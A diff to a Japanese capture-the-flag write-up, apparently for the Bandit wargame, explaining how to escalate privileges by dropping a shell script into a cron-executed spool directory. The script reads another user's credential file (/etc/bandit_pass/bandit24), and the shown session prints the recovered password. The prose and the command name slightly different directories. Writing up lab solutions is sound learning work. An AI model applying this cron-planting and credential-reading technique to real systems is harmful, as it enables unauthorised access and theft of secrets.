@@ -24,3 +24,27 @@ do
 done
 ```
 
+ここのshellscriptでは、`/var/spool/bandit23/foo`に入っているファイルでownerがbandit23なら実行するよ、と書かれており、1分ごとに実行されてはすべてのファイルが消されている様なので、実行されるディレクトリに良さげなシェルファイルを自分で作っておけば良い
+
+```
+bandit23@bandit:/tmp/sasaki$ cat test.sh
+#!/bin/bash
+#
+echo "copy bandit24 key to /tmp/sasaki/password.txt"
+
+cat /etc/bandit_pass/bandit24 > /tmp/sasaki/password.txt
+bandit23@bandit:/tmp/sasaki$ ls -la
+total 11052
+drwxrwxrwx    2 bandit23 bandit23     4096 Jan 28 22:00 .
+drwxrwx-wt 8524 root     root     11296768 Jan 28 22:00 ..
+-rwxrwxr-x    1 bandit23 bandit23      125 Jan 28 22:00 test.sh
+bandit23@bandit:/tmp/sasaki$ cp test.sh /var/spool/bandit24/foo/
+bandit23@bandit:/tmp/sasaki$ ls
+password.txt  test.sh
+bandit23@bandit:/tmp/sasaki$ cat password.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit23@bandit:/tmp/sasaki$
+```
+
+chmodで自分の/tmpに作成したディレクトリの書き込み権限を付与しておかないとpassword.txtが書き込めなくて死ぬので、それだけ注意
+`chdmo 777 .`をする。なぜか`chmod +w .`だとできなかった
